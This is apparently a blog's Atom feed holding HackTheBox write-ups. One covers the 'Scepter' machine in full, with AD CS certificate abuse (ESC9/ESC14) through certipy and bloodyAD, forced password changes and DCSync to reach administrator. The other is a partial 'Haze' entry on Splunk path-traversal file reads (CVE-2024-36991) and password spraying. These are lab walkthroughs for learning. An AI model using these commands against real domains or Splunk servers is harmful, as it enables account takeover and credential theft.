<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="https://your-site-url/feed.xml" rel="self" type="application/atom+xml" /><link href="https://your-site-url/" rel="alternate" type="text/html" /><updated>2025-07-24T14:11:59+00:00</updated><id>https://your-site-url/feed.xml</id><title type="html">Pwn3d777</title><subtitle>This is my blog, here you will find more information about me, as well as my work on HackTheBox and some interesting apps i&apos;ve developed.
</subtitle><author><name>GitHub User</name></author><entry><title type="html">Scepter-Windows-Hard</title><link href="https://your-site-url/writeups/2025/07/22/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9.html" rel="alternate" type="text/html" title="Scepter-Windows-Hard" /><published>2025-07-22T16:06:57+00:00</published><updated>2025-07-22T16:06:57+00:00</updated><id>https://your-site-url/writeups/2025/07/22/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9</id><content type="html" xml:base="https://your-site-url/writeups/2025/07/22/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9.html"><![CDATA[<h1 id="scepter">Scepter</h1>

<h1 id="1-enumeration">1. Enumeration<br /><br /></h1>

<p>Start by enumerating open ports, since this is a Windows machine, several Microsoft Network services running on it
<br /><br />
<img src="/assets/images/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9_image.png" alt="image.png" />
<br /><br />
<img src="/assets/images/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9_image_1.png" alt="image.png" />
<br /><br />
Port 2049/tcp is particularly interesting, nmap identifies it as nlockmgr (Network Lock Manager), a protocol that cooperates with Network File System (NFS) to prevent issues caused by simultaneous writing
<br /><br />
<img src="/assets/images/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9_image_2.png" alt="image.png" />
<br /><br />
Enumerate the current mount points in this host
<br /><br />
<img src="/assets/images/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9_image_3.png" alt="image.png" />
<br /><br />
<code class="language-plaintext highlighter-rouge">-a active mounts</code></p>

<p><code class="language-plaintext highlighter-rouge">-e available exports</code>
<br /><br />
<img src="/assets/images/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9_image_4.png" alt="image.png" />
<br /><br /></p>
<h1 id="2-user-flag">2. User flag</h1>
<p><br /><br />
Download available files from the mount
<br /><br />
<img src="/assets/images/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9_image_5.png" alt="image.png" />
<br /><br />
We have three .pfx files that we could try to crack in order to retrieve their pfx passwords and  generate new unprotected pfx files for domain authentication, but this will not work because those credentials have been revoked. Instead we could use one of these file to generate a hash to discover that a password was reused several times across all .pfx file. Then we can proceed to work with baker user, since we own needed files to create our own .pfx file and the password used for him is the same used for other users.
<br /><br />
Another approach is using <code class="language-plaintext highlighter-rouge">pem2john</code> tool with the <code class="language-plaintext highlighter-rouge">baker.key</code> file
<br /><br />
<img src="/assets/images/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9_image_6.png" alt="image.png" />
<br /><br />
To carry out the previously mentioned actions, start using <code class="language-plaintext highlighter-rouge">pfx2john</code> to generate a hash
<br /><br />
<img src="/assets/images/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9_image_7.png" alt="image.png" />
<br /><br />
Upon inspecting that hash, we found that the generated type was <code class="language-plaintext highlighter-rouge">pfxng</code>
<br /><br />
<img src="/assets/images/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9_image_8.png" alt="image.png" />
<br /><br />
You might encounter issues when cracking this hash because this format is not supported in some versions of john (at least not supported by the version included with kali), you can install a different version if you want,  although this could generate issues and might be problematic for your environment
<br /><br />
<img src="/assets/images/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9_image_9.png" alt="image.png" />
<br /><br />
<img src="/assets/images/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9_image_10.png" alt="image.png" />
<br /><br />
<img src="/assets/images/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9_image_11.png" alt="image.png" />
<br /><br />
<img src="/assets/images/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9_image_12.png" alt="image.png" />
<br /><br />
  The recommended tool to address this scenario is <code class="language-plaintext highlighter-rouge">crackpkcs12</code> that cracks <code class="language-plaintext highlighter-rouge">p12</code> and <code class="language-plaintext highlighter-rouge">pfx</code> files
<br /><br />
<img src="/assets/images/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9_99591778_a1d7_4d1d_a2aa_1fbff0d78c0a.png" alt="image.png" />
<br /><br />
Once the password is found, we can obtain a <code class="language-plaintext highlighter-rouge">pxf</code> file in name of <code class="language-plaintext highlighter-rouge">baker</code>
<br /><br />
<img src="/assets/images/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9_image_13.png" alt="image.png" />
<br /><br />
Use that file to request a tgt using auth module in certipy
<br /><br /></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">certipy</span> <span class="n">auth</span> <span class="o">-</span><span class="n">pfx</span> <span class="p">.</span><span class="n">pfx</span>
</code></pre></div></div>
<p><br /><br />
<img src="/assets/images/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9_image_14.png" alt="image.png" />
<br /><br />
Set <code class="language-plaintext highlighter-rouge">/etc/resolv.conf</code> to avoid potential DNS problems while running the bloodhound collector
<br /><br />
<img src="/assets/images/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9_image_15.png" alt="image.png" />
<br /><br /></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">bloodhound</span><span class="o">-</span><span class="n">python</span> <span class="o">-</span><span class="n">u</span> <span class="n">d</span><span class="p">.</span><span class="n">baker</span> <span class="o">--</span><span class="n">hashes</span> <span class="p">:</span><span class="nb">hash</span> <span class="o">-</span><span class="n">ns</span> <span class="n">dns</span> <span class="o">-</span><span class="n">d</span> <span class="n">domain</span> <span class="o">-</span><span class="n">c</span> <span class="n">ALL</span>
</code></pre></div></div>
<p><br /><br />
<img src="/assets/images/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9_image_16.png" alt="image.png" />
<br /><br />
Checking the information displayed by Bloodhound we discovered that <code class="language-plaintext highlighter-rouge">p.adams</code> has <code class="language-plaintext highlighter-rouge">DCSync</code> privileges. Additionally, the account operators group has <code class="language-plaintext highlighter-rouge">generic all</code> privileges over him, and he is also associated with a  <code class="language-plaintext highlighter-rouge">helpdesk enrrollment certificate</code> , for that reason, he will be our final target account in order to compromise administrator account
<br /><br />
<img src="/assets/images/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9_image_17.png" alt="image.png" />
<br /><br />
But for now we need to obtain the user flag first. Mark <code class="language-plaintext highlighter-rouge">d.baker</code> as owned, and identify the <code class="language-plaintext highlighter-rouge">ForceChangePassword</code> policy that he has over <code class="language-plaintext highlighter-rouge">a.carter</code>
<br /><br />
<img src="/assets/images/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9_image_18.png" alt="image.png" />
<br /><br />
Abuse this configuration using
<br /><br /></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">bloodyAD</span> <span class="o">--</span><span class="n">host</span> <span class="n">dc01</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">d</span> <span class="n">domain</span><span class="p">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">u</span> <span class="n">atacker</span> <span class="o">-</span><span class="n">p</span> <span class="p">:</span><span class="nb">hash</span> <span class="nb">set</span> <span class="n">password</span> <span class="n">victim</span> <span class="n">newpassword</span>
</code></pre></div></div>
<p><br /><br />
<img src="/assets/images/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9_image_19.png" alt="image.png" />
<br /><br />
<code class="language-plaintext highlighter-rouge">A.carter</code> is member of <code class="language-plaintext highlighter-rouge">IT support</code> group which holds <code class="language-plaintext highlighter-rouge">GenericAll</code> privileges over the <code class="language-plaintext highlighter-rouge">staff access certificate</code>
<br /><br />
<img src="/assets/images/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9_image_20.png" alt="image.png" />
<br /><br />
It is curious that this template contains <code class="language-plaintext highlighter-rouge">d.baker</code> ; this might be vulnerable to some <code class="language-plaintext highlighter-rouge">ESC</code> technique due to a clear misconfiguration
<br /><br />
<img src="/assets/images/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9_image_21.png" alt="image.png" />
<br /><br />
Let’s go through this step by step. First, let’s try to obtain all possible privileges over the users the have owned
<br /><br />
<img src="/assets/images/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9_image_22.png" alt="image.png" />
<br /><br />
Find <code class="language-plaintext highlighter-rouge">ESC</code> type vulnerabilities using <code class="language-plaintext highlighter-rouge">certipy</code> tool
<br /><br /></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">certipy</span> <span class="n">find</span> <span class="o">-</span><span class="n">u</span> <span class="n">d</span><span class="p">.</span><span class="n">baker</span> <span class="o">-</span><span class="n">p</span> <span class="s">'hash'</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="n">ip</span>
</code></pre></div></div>
<p><br /><br />
<img src="/assets/images/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9_image_23.png" alt="image.png" />
<br /><br />
It says that d.baker might be vulnerable to <code class="language-plaintext highlighter-rouge">ESC9</code> but to perform this attack we need to be able to include the <code class="language-plaintext highlighter-rouge">UPN</code> in the <code class="language-plaintext highlighter-rouge">SAN</code> of the target user, and this configuration is not present, we only can include email in the <code class="language-plaintext highlighter-rouge">SAN</code> . Even so, now we are aware that this certification template has no security extension flag. We can also notice that this certificate template has <code class="language-plaintext highlighter-rouge">SubjectAltRequireEmail</code> set as a valid name option
<br /><br />
<img src="/assets/images/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9_image_24.png" alt="image.png" />
<br /><br />
Then, use the following command to discover that the <code class="language-plaintext highlighter-rouge">altSecurityIdentity</code> property is used to identify <code class="language-plaintext highlighter-rouge">hbrowm</code> user. 
<br /><br /></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">netexec</span> <span class="n">ldap</span> <span class="n">scepter</span><span class="p">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">u</span> <span class="n">d</span><span class="p">.</span><span class="n">baker</span> <span class="o">-</span><span class="n">H</span> <span class="mi">18</span><span class="n">b5fb0d99e7a475316213c15b6f22ce</span> <span class="o">--</span><span class="n">query</span> <span class="s">"(sAMAccountName=h.brown)"</span> <span class="s">""</span>
</code></pre></div></div>
<p><br /><br />
This property is related with ESC14 and we are going to see a lot of it on this machine
<br /><br />
You can see more information about it here:
<br /><br />
https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9
<br /><br />
<img src="/assets/images/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9_image_25.png" alt="image.png" />
<br /><br />
With all the information gathered so far, we can perform an attack to escalate to h.brown user
<br /><br /></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">bloodyAD</span> <span class="o">--</span><span class="n">host</span> <span class="n">dc01</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">d</span> <span class="n">domain</span><span class="p">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">u</span> <span class="n">a</span><span class="p">.</span><span class="n">carter</span> <span class="o">-</span><span class="n">p</span> <span class="s">'password'</span> <span class="nb">set</span> <span class="nb">object</span> <span class="s">'user-owned'</span> <span class="n">mail</span> <span class="o">-</span><span class="n">v</span> <span class="s">'target@mail.htb'</span>
<span class="n">certipy</span> <span class="n">req</span> <span class="o">-</span><span class="n">ca</span> <span class="n">CA</span> <span class="o">-</span><span class="n">u</span> <span class="s">'user-owned'</span> <span class="o">-</span><span class="n">hashes</span> <span class="p">:</span><span class="nb">hash</span> <span class="o">-</span><span class="n">template</span> <span class="n">vulnerabletemplate</span> <span class="o">-</span><span class="n">target</span> <span class="n">dc01</span><span class="p">.</span><span class="n">scepter</span><span class="p">.</span><span class="n">htb</span>
<span class="n">certipy</span> <span class="n">auth</span> <span class="o">-</span><span class="n">domain</span> <span class="n">domain</span><span class="p">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">pfx</span> <span class="p">.</span><span class="n">pfx</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="n">ip</span> <span class="o">-</span><span class="n">username</span> <span class="s">'target'</span>
</code></pre></div></div>
<p><br /><br />
<img src="/assets/images/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9_image_26.png" alt="image.png" />
<br /><br />
Set the <code class="language-plaintext highlighter-rouge">/etc/krb5.conf</code>
<br /><br />
<img src="/assets/images/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9_image_27.png" alt="image.png" />
<br /><br />
Use the obtained hash to get a TGT and get remote access as h.brown
<br /><br />
<img src="/assets/images/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9_7e673afa_a3cb_4d7e_a84e_f9e1afe1d10f.png" alt="image.png" />
<br /><br /></p>
<h1 id="3priv-esc">3.Priv esc</h1>
<p><br /><br />
Check write permissions for <code class="language-plaintext highlighter-rouge">h.brown</code> user
<br /><br />
<img src="/assets/images/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9_image_28.png" alt="image.png" />
<br /><br />
Write permissions in <code class="language-plaintext highlighter-rouge">altSecurityIdentities</code> property over <code class="language-plaintext highlighter-rouge">p.adams</code> open up another potential attack ESC14 vector mixed with the previous scenario exploited
<br /><br />
<img src="/assets/images/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9_image_29.png" alt="image.png" />
<br /><br />
Basically we are going to set an weak X509RFC822 explicit mapping in <code class="language-plaintext highlighter-rouge">altSecurityIdentities</code> using scenario A (Write permissions) to then perform the previous attack using scenario B
<br /><br />
<img src="/assets/images/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9_image_30.png" alt="image.png" />
<br /><br />
Use the following commands to spoof <code class="language-plaintext highlighter-rouge">p.adams</code> 
<br /><br /></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#Set property in p.adams 
</span><span class="n">bloodyAD</span> <span class="o">--</span><span class="n">host</span> <span class="n">dc01</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">d</span> <span class="n">domain</span><span class="p">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">u</span> <span class="n">attacker1</span> <span class="o">-</span><span class="n">k</span> <span class="nb">set</span> <span class="nb">object</span> <span class="s">'victim'</span> <span class="n">altSecurityIdentities</span> <span class="o">-</span><span class="n">v</span> <span class="s">'x509:&lt;RFC822&gt;p.adams@scepter.htb'</span>
<span class="c1">#Make h.brown use p.adams email
</span><span class="n">bloodyAD</span> <span class="o">--</span><span class="n">host</span> <span class="n">dc01</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">d</span> <span class="n">domain</span><span class="p">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">u</span> <span class="n">attacker2</span> <span class="o">-</span><span class="n">p</span> <span class="s">'password'</span> <span class="nb">set</span> <span class="nb">object</span> <span class="s">'attacker1'</span> <span class="n">mail</span> <span class="o">-</span><span class="n">v</span> <span class="s">'target@domain.htb'</span>
</code></pre></div></div>
<p><br /><br />
<img src="/assets/images/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9_image_31.png" alt="image.png" />
<br /><br /></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#Request a .pfx fila as p.adams using d.baker ticket
</span><span class="n">certipy</span> <span class="n">req</span> <span class="o">-</span><span class="n">ca</span> <span class="n">CA</span> <span class="o">-</span><span class="n">u</span> <span class="s">'user-owned'</span> <span class="o">-</span><span class="n">k</span> <span class="o">-</span><span class="n">template</span> <span class="n">vulnerabletemplate</span> <span class="o">-</span><span class="n">target</span> <span class="n">dc01</span><span class="p">.</span><span class="n">scepter</span><span class="p">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">out</span> <span class="n">p</span><span class="p">.</span><span class="n">adams</span>
</code></pre></div></div>
<p><br /><br />
<img src="/assets/images/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9_image_32.png" alt="image.png" />
<br /><br /></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#Authenticate and the nt hash for p.adams
</span><span class="n">certipy</span> <span class="n">auth</span> <span class="o">-</span><span class="n">domain</span> <span class="n">domain</span><span class="p">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">pfx</span> <span class="p">.</span><span class="n">pfx</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="n">ip</span> <span class="o">-</span><span class="n">username</span> <span class="s">'target'</span>
</code></pre></div></div>
<p><br /><br />
<img src="/assets/images/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9_image_33.png" alt="image.png" />
<br /><br />
As <code class="language-plaintext highlighter-rouge">p.adams</code> has DCSync privileges, proceed to dump secrets to then access as administrator
<br /><br />
<img src="/assets/images/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9_image_34.png" alt="image.png" />
<br /><br />
Machine pwned@@@##!
<script src="/assets/js/matrix-overlay.js"></script></p>
<link rel="stylesheet" href="/assets/css/imagesstyle.css" />]]></content><author><name>GitHub User</name></author><category term="writeups" /><summary type="html"><![CDATA[Scepter]]></summary></entry><entry><title type="html">Haze-Windows-Hard</title><link href="https://your-site-url/writeups/2025/07/20/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f.html" rel="alternate" type="text/html" title="Haze-Windows-Hard" /><published>2025-07-20T16:05:57+00:00</published><updated>2025-07-20T16:05:57+00:00</updated><id>https://your-site-url/writeups/2025/07/20/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f</id><content type="html" xml:base="https://your-site-url/writeups/2025/07/20/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f.html"><![CDATA[<h1 id="haze">Haze</h1>

<h1 id="1-enumeration">1. Enumeration</h1>
<p><br /><br />
Start port enumeration
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image.png" alt="image.png" />
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_1.png" alt="image.png" />
<br /><br />
Splunk web service is running on port 8000, a login form is displayed but we don’t have any credentials yet
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_2.png" alt="image.png" />
<br /><br /></p>
<h1 id="2-user-flag">2. User flag</h1>
<p><br /><br />
Search the internet to identify vulnerabilities like CVE-2024-36991. Arbitrary file read through reverse path traversal, this is possible thanks to <code class="language-plaintext highlighter-rouge">os.path.join</code> which concatenates the whole path ignoring any part of the string that includes a drive letter (<code class="language-plaintext highlighter-rouge">c:</code> in this case) 
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_3.png" alt="image.png" />
<br /><br />
The next payload will be processed by the function and it will take the first <code class="language-plaintext highlighter-rouge">C:</code> probably located in the backend and it will ignore any other <code class="language-plaintext highlighter-rouge">C:</code> references treating the next as part of the path, in this way, path traversal filtering will be bypassed disclosing files outside the current directory
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_4.png" alt="image.png" />
<br /><br />
Check <code class="language-plaintext highlighter-rouge">/etc/passwd</code> to confirm this environment is vulnerable, some hashes were found but they are not easy crackeable
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_5.png" alt="image.png" />
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_6.png" alt="image.png" />
<br /><br />
Chat-gpt helps us to locate interesting taking advantage of splunk
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_7.png" alt="image.png" />
<br /><br />
The secret is disclosed, now we need hashes to crack with this secret
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_8.png" alt="image.png" />
<br /><br />
In the configuration files we will discover some hashes
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_9.png" alt="image.png" />
<br /><br />
However, only in the authentication file does a hash have a Common Name
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_10.png" alt="image.png" />
<br /><br />
Use <code class="language-plaintext highlighter-rouge">splunksecrets</code> tool to decrypt the hash found using the secret disclosed
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_11.png" alt="image.png" />
<br /><br />
Make sure that this password is valid on ldap authentication
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_12.png" alt="image.png" />
<br /><br />
It’s time to enumerate user in the domain
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_13.png" alt="image.png" />
<br /><br />
Use those users to spray the password
<br /><br />
